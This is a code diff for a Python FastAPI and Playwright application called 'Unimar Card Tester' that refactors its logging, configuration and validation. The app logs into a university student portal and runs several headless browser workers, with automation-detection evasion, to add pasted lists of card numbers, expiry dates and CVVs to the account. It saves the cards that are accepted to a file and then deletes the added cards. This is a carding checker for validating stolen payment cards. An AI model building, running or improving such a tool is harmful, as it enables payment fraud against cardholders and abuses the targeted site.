@@ -1,19 +1,15 @@
 import asyncio
-import json
 import os
 import random
 import time
-import sys
 from contextlib import asynccontextmanager
 from pathlib import Path
 from typing import Optional, Set
 
-
-import structlog
 import uvicorn
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
 from fastapi.responses import HTMLResponse
-from pydantic import BaseModel, validator
+from pydantic import BaseModel, field_validator
 from slowapi import Limiter
 from slowapi.util import get_remote_address
 from slowapi.middleware import SlowAPIMiddleware
@@ -22,21 +18,28 @@ from playwright.async_api import async_playwright, Browser, BrowserContext, Page
 
 # ===================== CONFIG =====================
 class Config:
-    URL_LOGIN = "https://digital.unimar.br/login"
-    URL_MEUS_CARTOES = "https://digital.unimar.br/areadoaluno/conta/meuscartoes"
+    URL_LOGIN = os.getenv("UNIMAR_URL_LOGIN", "https://digital.unimar.br/login")
+    URL_MEUS_CARTOES = os.getenv("UNIMAR_URL_CARTOES", "https://digital.unimar.br/areadoaluno/conta/meuscartoes")
     
     EMAIL = os.getenv("UNIMAR_EMAIL")
     SENHA = os.getenv("UNIMAR_SENHA")
     NOME_FIXO = os.getenv("UNIMAR_NOME", "Bruna Mendes")
     
-    SESSAO_PATH = Path("sessao_unimar.json")
-    SESSAO_MAX_AGE = 86400  # 24 horas
+    SESSAO_PATH = Path(os.getenv("UNIMAR_SESSAO_PATH", "sessao_unimar.json"))
+    SESSAO_MAX_AGE = int(os.getenv("UNIMAR_SESSAO_MAX_AGE", "86400"))
     
-    MAX_TENTATIVAS = 3
-    MAX_CANAIS = 6
-    VIEWPORT = {"width": 1280, "height": 720}
+    MAX_TENTATIVAS = int(os.getenv("UNIMAR_MAX_TENTATIVAS", "3"))
+    MAX_CANAIS = int(os.getenv("UNIMAR_MAX_CANAIS", "6"))
     
-    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+    VIEWPORT = {"width": int(os.getenv("UNIMAR_VIEWPORT_WIDTH", "1280")), 
+                "height": int(os.getenv("UNIMAR_VIEWPORT_HEIGHT", "720"))}
+    
+    USER_AGENT = os.getenv(
+        "UNIMAR_USER_AGENT",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+    )
+    
+    HEADLESS = os.getenv("UNIMAR_HEADLESS", "true").lower() == "true"
     
     BROWSER_ARGS = [
         "--no-sandbox",
@@ -45,10 +48,25 @@ class Config:
         "--disable-web-security",
         "--disable-features=IsolateOrigins,site-per-process",
         "--disable-blink-features=AutomationControlled",
+        "--disable-setuid-sandbox",
+        "--no-first-run",
+        "--no-zygote",
+        "--disable-extensions",
+        "--disable-background-networking",
+        "--disable-sync",
+        "--disable-translate",
+        "--hide-scrollbars",
+        "--mute-audio",
+        "--no-default-browser-check",
     ]
 
-# ===================== LOGGING =====================
-logger = structlog.get_logger()
+# ===================== LOGGING SIMPLES =====================
+# Usando print simples em vez de structlog para evitar complexidade
+def log_message(mensagem: str):
+    timestamp = time.strftime("%H:%M:%S")
+    full_msg = f"[{timestamp}] {mensagem}"
+    print(full_msg)
+    asyncio.create_task(broadcast("log", {"mensagem": full_msg}))
 
 # ===================== ESTADO =====================
 class EstadoManager:
@@ -108,9 +126,6 @@ async def broadcast(type: str, data: dict = None):
         data = {}
     message = {"type": type, **data}
     
-    # Log estruturado
-    await logger.info("broadcast", type=type, **data)
-    
     clients = await estado.get_clients()
     dead = set()
     
@@ -123,24 +138,20 @@ async def broadcast(type: str, data: dict = None):
     for client in dead:
         await estado.remove_client(client)
 
-async def log_message(mensagem: str):
-    timestamp = time.strftime("%H:%M:%S")
-    full_msg = f"[{timestamp}] {mensagem}"
-    print(full_msg)  # Mantém compatibilidade com log console
-    asyncio.create_task(broadcast("log", {"mensagem": full_msg}))
-
-# ===================== VALIDATION =====================
+# ===================== VALIDATION (Pydantic V2) =====================
 class IniciarRequest(BaseModel):
     lista: str
     canais: int = 4
     
-    @validator('canais')
+    @field_validator('canais')
+    @classmethod
     def validar_canais(cls, v):
         if v < 1 or v > Config.MAX_CANAIS:
             raise ValueError(f'Canais deve ser entre 1 e {Config.MAX_CANAIS}')
         return v
     
-    @validator('lista')
+    @field_validator('lista')
+    @classmethod
     def validar_lista(cls, v):
         if not v.strip():
             raise ValueError('Lista de cartões não pode estar vazia')
@@ -152,10 +163,10 @@ async def lifespan(app: FastAPI):
     # Startup
     Config.SESSAO_PATH.touch(exist_ok=True)
     Path("aprovados.txt").touch(exist_ok=True)
-    await logger.info("app_started")
+    print("🚀 Aplicação iniciada com sucesso!")
     yield
     # Shutdown
-    await logger.info("app_shutdown")
+    print("👋 Aplicação finalizada")
 
 # Inicialização do FastAPI
 app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)
@@ -215,29 +226,8 @@ async def websocket_endpoint(websocket: WebSocket):
         await estado.remove_client(websocket)
 
 # ===================== PLAYWRIGHT HELPERS =====================
-async def create_browser_context(playwright, storage_state: Optional[Path] = None) -> tuple[Browser, BrowserContext]:
-    """Cria browser e contexto com configurações otimizadas."""
-    browser = await playwright.chromium.launch(
-        headless=True,
-        args=Config.BROWSER_ARGS
-    )
-    
-    context = await browser.new_context(
-        storage_state=str(storage_state) if storage_state else None,
-        viewport=Config.VIEWPORT,
-        user_agent=Config.USER_AGENT
-    )
-    
-    return browser, context
-
-async def create_page(context: BrowserContext) -> Page:
-    """Cria uma nova página com handler de diálogo."""
-    page = await context.new_page()
-    page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))
-    return page
-
 async def sessao_e_valida(playwright) -> bool:
-    """Testa rapidamente se a sessão salva ainda funciona (Modo Fast)."""
+    """Testa rapidamente se a sessão salva ainda funciona."""
     sessao = Config.SESSAO_PATH
     if not sessao.exists():
         return False
@@ -245,8 +235,15 @@ async def sessao_e_valida(playwright) -> bool:
         return False
     
     try:
-        browser, context = await create_browser_context(playwright)
-        page = await create_page(context)
+        browser = await playwright.chromium.launch(
+            headless=Config.HEADLESS,
+            args=Config.BROWSER_ARGS
+        )
+        context = await browser.new_context(
+            viewport=Config.VIEWPORT,
+            user_agent=Config.USER_AGENT
+        )
+        page = await context.new_page()
         
         await page.goto(Config.URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=15000)
         await asyncio.sleep(0.8)
@@ -257,13 +254,13 @@ async def sessao_e_valida(playwright) -> bool:
         await browser.close()
         return valida
     except Exception as e:
-        await logger.warning("validacao_sessao_falhou", erro=str(e))
+        print(f"[AVISO] Validação de sessão falhou: {e}")
         return False
 
 async def limpar_cartoes_antigos(page: Page):
-    """Faxina robusta: scroll, espera ativa, retry e verificação de sumiço do elemento."""
+    """Faxina robusta de cartões existentes."""
     try:
-        await log_message("[Faxina] Iniciando limpeza...")
+        log_message("[Faxina] Iniciando limpeza...")
         await page.goto(Config.URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
         await asyncio.sleep(1.5)
         
@@ -272,14 +269,14 @@ async def limpar_cartoes_antigos(page: Page):
         
         for iteracao in range(max_iteracoes):
             if estado.get("cancelado"):
-                await log_message("[Faxina] Cancelado pelo usuário.")
+                log_message("[Faxina] Cancelado pelo usuário.")
                 break
             
             botoes_remover = page.get_by_role("button", name="Remover")
             quantidade = await botoes_remover.count()
             
             if quantidade == 0:
-                await log_message("[Faxina] Nenhum botão 'Remover' encontrado. Limpo!")
+                log_message("[Faxina] Nenhum botão 'Remover' encontrado. Limpo!")
                 break
             
             botao = botoes_remover.first
@@ -314,7 +311,7 @@ async def limpar_cartoes_antigos(page: Page):
                     await botao.wait_for(state="hidden", timeout=5000)
                     removido_aqui = True
                 except Exception:
-                    await log_message("[Faxina] Confirmação não apareceu. Recarregando...")
+                    log_message("[Faxina] Confirmação não apareceu. Recarregando...")
                     await page.goto(Config.URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
                     await asyncio.sleep(1.0)
                     continue
@@ -323,22 +320,30 @@ async def limpar_cartoes_antigos(page: Page):
                 removidos += 1
                 await asyncio.sleep(0.4)
         
-        await log_message(f"[Faxina] {removidos} cartão(ões) removido(s).")
+        log_message(f"[Faxina] {removidos} cartão(ões) removido(s).")
     except Exception as e:
-        await log_message(f"[Faxina] Erro: {e}")
+        log_message(f"[Faxina] Erro: {e}")
 
 async def login_mestre(playwright) -> bool:
     """Login com Modo Fast (reuse) e Modo Full (UI)."""
     try:
         # MODO FAST
         if await sessao_e_valida(playwright):
-            await log_message("[Autenticação] Sessão reutilizada (Modo Fast).")
+            log_message("[Autenticação] Sessão reutilizada (Modo Fast).")
             return True
         
         # MODO FULL
-        await log_message("[Autenticação] Login mestre (Modo Full)...")
-        browser, context = await create_browser_context(playwright)
-        page = await create_page(context)
+        log_message("[Autenticação] Login mestre (Modo Full)...")
+        browser = await playwright.chromium.launch(
+            headless=Config.HEADLESS,
+            args=Config.BROWSER_ARGS
+        )
+        context = await browser.new_context(
+            viewport=Config.VIEWPORT,
+            user_agent=Config.USER_AGENT
+        )
+        page = await context.new_page()
+        page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))
         
         await page.goto(Config.URL_LOGIN, wait_until="domcontentloaded", timeout=60000)
         await page.get_by_role("textbox", name="E-mail ou CPF").fill(Config.EMAIL)
@@ -351,10 +356,10 @@ async def login_mestre(playwright) -> bool:
         
         await context.close()
         await browser.close()
-        await log_message("[Autenticação] Login concluído!")
+        log_message("[Autenticação] Login concluído!")
         return True
     except Exception as e:
-        await log_message(f"[ERRO] Login falhou: {e}")
+        log_message(f"[ERRO] Login falhou: {e}")
         return False
 
 # ===================== WORKER =====================
@@ -368,14 +373,15 @@ async def worker_contexto(id_worker: int, browser: Browser, fila: asyncio.Queue)
     
     try:
         await asyncio.sleep(id_worker * 1.2)
-        await log_message(f"[Canal {id_worker}] Iniciando...")
+        log_message(f"[Canal {id_worker}] Iniciando...")
         
         context = await browser.new_context(
             storage_state=str(Config.SESSAO_PATH),
             viewport=Config.VIEWPORT,
             user_agent=Config.USER_AGENT
         )
-        page = await create_page(context)
+        page = await context.new_page()
+        page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))
         
         await page.goto(Config.URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
         await asyncio.sleep(0.8)
@@ -396,19 +402,14 @@ async def worker_contexto(id_worker: int, browser: Browser, fila: asyncio.Queue)
             try:
                 partes = [x.strip() for x in linha.split("|")]
                 if len(partes) != 4:
-                    await log_message(f"[Canal {id_worker}][Item {indice}] ❌ Formato inválido: {linha}")
+                    log_message(f"[Canal {id_worker}][Item {indice}] ❌ Formato inválido: {linha}")
                     fila.task_done()
                     await estado.increment("tarefas_concluidas")
                     await broadcast("reprovado", {"cartao": linha})
-                    await broadcast("progresso", {
-                        "processados": estado.get("tarefas_concluidas"),
-                        "total": estado.get("total_cartoes"),
-                        "aprovados": estado.get("aprovados"),
-                    })
                     continue
                 
                 numero, mes, ano, cvv = partes
-                await log_message(f"[Canal {id_worker}][Item {indice}] ****{numero[-4:]} (tentativa {tentativa})")
+                log_message(f"[Canal {id_worker}][Item {indice}] ****{numero[-4:]} (tentativa {tentativa})")
                 
                 await page.goto(Config.URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
                 await asyncio.sleep(random.uniform(0.4, 1.0))
@@ -453,7 +454,7 @@ async def worker_contexto(id_worker: int, browser: Browser, fila: asyncio.Queue)
                 
                 # Tratamento de resultado
                 if resultado == "aprovado":
-                    await log_message(f"[Canal {id_worker}][Item {indice}] ✅ APROVADO")
+                    log_message(f"[Canal {id_worker}][Item {indice}] ✅ APROVADO")
                     await broadcast("aprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
                     await estado.increment("aprovados")
                     
@@ -463,30 +464,29 @@ async def worker_contexto(id_worker: int, browser: Browser, fila: asyncio.Queue)
                             f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
                 
                 elif resultado == "reprovado":
-                    await log_message(f"[Canal {id_worker}][Item {indice}] ❌ Reprovado")
+                    log_message(f"[Canal {id_worker}][Item {indice}] ❌ Reprovado")
                     await broadcast("reprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
                 
                 elif resultado == "cancelado":
-                    await log_message(f"[Canal {id_worker}][Item {indice}] ⏹️ Cancelado")
+                    log_message(f"[Canal {id_worker}][Item {indice}] ⏹️ Cancelado")
                 
                 else:  # timeout
                     if tentativa < Config.MAX_TENTATIVAS:
-                        await log_message(f"[Canal {id_worker}][Item {indice}] ⚠️ Timeout — Re-enfileirando ({tentativa + 1}/{Config.MAX_TENTATIVAS})")
+                        log_message(f"[Canal {id_worker}][Item {indice}] ⚠️ Timeout — Re-enfileirando ({tentativa + 1}/{Config.MAX_TENTATIVAS})")
                         await fila.put((indice, linha, tentativa + 1))
                         deve_contar = False
                     else:
-                        await log_message(f"[Canal {id_worker}][Item {indice}] ❌ Timeout máximo")
+                        log_message(f"[Canal {id_worker}][Item {indice}] ❌ Timeout máximo")
                         await broadcast("reprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
             
             except Exception as e:
                 erro_msg = str(e).lower()
-                await logger.error("worker_erro", worker=id_worker, item=indice, erro=erro_msg)
+                print(f"[ERRO] Canal {id_worker} Item {indice}: {e}")
                 
                 # Crash recovery
                 if any(kw in erro_msg for kw in ["crashed", "closed", "target"]):
-                    await log_message(f"[Canal {id_worker}] 🔄 Página crashou. Recuperando...")
+                    log_message(f"[Canal {id_worker}] 🔄 Página crashou. Recuperando...")
                     
-                    # Limpa recursos antigos
                     try:
                         if page:
                             await page.close()
@@ -495,16 +495,16 @@ async def worker_contexto(id_worker: int, browser: Browser, fila: asyncio.Queue)
                     except Exception:
                         pass
                     
-                    # Recria contexto
                     context = await browser.new_context(
                         storage_state=str(Config.SESSAO_PATH),
                         viewport=Config.VIEWPORT,
                         user_agent=Config.USER_AGENT
                     )
-                    page = await create_page(context)
+                    page = await context.new_page()
+                    page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))
                     
                     if tentativa < Config.MAX_TENTATIVAS:
-                        await log_message(f"[Canal {id_worker}][Item {indice}] ⚠️ Crash — Re-enfileirando")
+                        log_message(f"[Canal {id_worker}][Item {indice}] ⚠️ Crash — Re-enfileirando")
                         await fila.put((indice, linha, tentativa + 1))
                         deve_contar = False
                     else:
@@ -530,7 +530,7 @@ async def worker_contexto(id_worker: int, browser: Browser, fila: asyncio.Queue)
                     })
     
     except Exception as e:
-        await logger.error("worker_fatal", worker=id_worker, erro=str(e))
+        print(f"[ERRO FATAL] Canal {id_worker}: {e}")
     finally:
         if context:
             try:
@@ -539,27 +539,12 @@ async def worker_contexto(id_worker: int, browser: Browser, fila: asyncio.Queue)
                 pass
         await estado.decrement("canais_ativos")
         await broadcast("status", {"canais_ativos": estado.get("canais_ativos")})
-        await log_message(f"[Canal {id_worker}] Finalizado")
-        
-# ===================== CONFIGURAÇÃO RAILWAY =====================
-# Railway define a porta via variável de ambiente PORT
-PORT = int(os.getenv("PORT", 5000))
+        log_message(f"[Canal {id_worker}] Finalizado")
 
-# Garante que diretórios necessários existam
-Path("templates").mkdir(exist_ok=True)
-Path("aprovados.txt").touch(exist_ok=True)
-
-# Verifica variáveis obrigatórias
-if not os.getenv("UNIMAR_EMAIL") or not os.getenv("UNIMAR_SENHA"):
-    print("⚠️  ATENÇÃO: Variáveis UNIMAR_EMAIL e UNIMAR_SENHA não configuradas!")
-    print("Configure-as nas variáveis de ambiente do Railway:")
-    print("https://railway.app/dashboard -> Seu Projeto -> Variables")
-    
 # ===================== PROCESSAMENTO =====================
 async def processar_cartoes(texto_cartoes: str, num_canais: int):
     """Processa lista de cartões com múltiplos workers."""
     try:
-        # Prepara lista
         linhas = list(dict.fromkeys([l.strip() for l in texto_cartoes.splitlines() if l.strip()]))
         
         await estado.set("total_cartoes", len(linhas))
@@ -573,15 +558,14 @@ async def processar_cartoes(texto_cartoes: str, num_canais: int):
         
         total = estado.get("total_cartoes")
         if total == 0:
-            await log_message("[ERRO] Nenhum cartão fornecido.")
+            log_message("[ERRO] Nenhum cartão fornecido.")
             return
         
         num_canais = min(max(num_canais, 1), Config.MAX_CANAIS)
         num_canais = min(num_canais, total)
         
-        await log_message(f"[Sistema] {num_canais} canais | {total} cartões")
+        log_message(f"[Sistema] {num_canais} canais | {total} cartões")
         
-        # Cria fila
         fila = asyncio.Queue()
         for idx, linha in enumerate(linhas, 1):
             await fila.put((idx, linha, 1))
@@ -591,7 +575,7 @@ async def processar_cartoes(texto_cartoes: str, num_canais: int):
                 return
             
             browser = await pw.chromium.launch(
-                headless=True,
+                headless=Config.HEADLESS,
                 args=Config.BROWSER_ARGS
             )
             
@@ -602,31 +586,31 @@ async def processar_cartoes(texto_cartoes: str, num_canais: int):
                 ]
                 await asyncio.gather(*tasks, return_exceptions=True)
                 
-                # Faxina final se houver aprovados
                 if estado.get("aprovados") > 0 and not estado.get("cancelado"):
-                    await log_message("[Sistema] Faxina final...")
+                    log_message("[Sistema] Faxina final...")
                     try:
                         context = await browser.new_context(
                             storage_state=str(Config.SESSAO_PATH),
                             viewport=Config.VIEWPORT,
                             user_agent=Config.USER_AGENT
                         )
-                        page = await create_page(context)
+                        page = await context.new_page()
+                        page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))
                         await limpar_cartoes_antigos(page)
                         await context.close()
                     except Exception as e:
-                        await log_message(f"[Faxina Final] Erro: {e}")
+                        log_message(f"[Faxina Final] Erro: {e}")
             
             finally:
                 await browser.close()
     
     except Exception as e:
-        await logger.error("processamento_erro_critico", erro=str(e))
+        print(f"[ERRO CRÍTICO] {e}")
     finally:
         await estado.set("rodando", False)
         await estado.set("cancelado", False)
         await estado.set("canais_ativos", 0)
-        await log_message("[Sistema] Processamento concluído")
+        log_message("[Sistema] Processamento concluído")
         await broadcast("status", {"rodando": False, "canais_ativos": 0})
 
 # ===================== ROTAS =====================
@@ -649,7 +633,7 @@ async def iniciar(data: IniciarRequest, request: Request):
 async def parar(request: Request):
     await estado.set("rodando", False)
     await estado.set("cancelado", True)
-    await log_message("⛔ Interrupção solicitada.")
+    log_message("⛔ Interrupção solicitada.")
     await broadcast("status", {"rodando": False})
     return {"status": "parando"}
 
@@ -675,7 +659,6 @@ async def health():
     return {
         "status": "healthy",
         "memory_mb": round(psutil.Process().memory_info().rss / 1024 / 1024, 2),
-        "uptime": round(time.time() - estado.get("inicio_timestamp"), 2) if estado.get("inicio_timestamp") else 0
     }
 
 @app.get("/", response_class=HTMLResponse)
@@ -683,16 +666,23 @@ async def index():
     with open("templates/index.html", encoding="utf-8") as f:
         return f.read()
 
+# ===================== INICIALIZAÇÃO =====================
 if __name__ == "__main__":
-    # Configuração para Railway
+    PORT = int(os.getenv("PORT", 5000))
+    
     print(f"🚀 Iniciando servidor na porta {PORT}")
     print(f"📊 Dashboard: https://web.railway.app")
+    
+    # Verificar variáveis obrigatórias
+    if not Config.EMAIL or not Config.SENHA:
+        print("⚠️  ATENÇÃO: Variáveis UNIMAR_EMAIL e UNIMAR_SENHA não configuradas!")
+        print("Configure-as nas variáveis de ambiente do Railway")
     
     uvicorn.run(
         "main:app",
         host="0.0.0.0",
         port=PORT,
-        workers=1,  # Railway recomenda 1 worker por instância
+        workers=1,
         log_level="info",
-        reload=False  # Desabilitado em produção
+        reload=False
     )
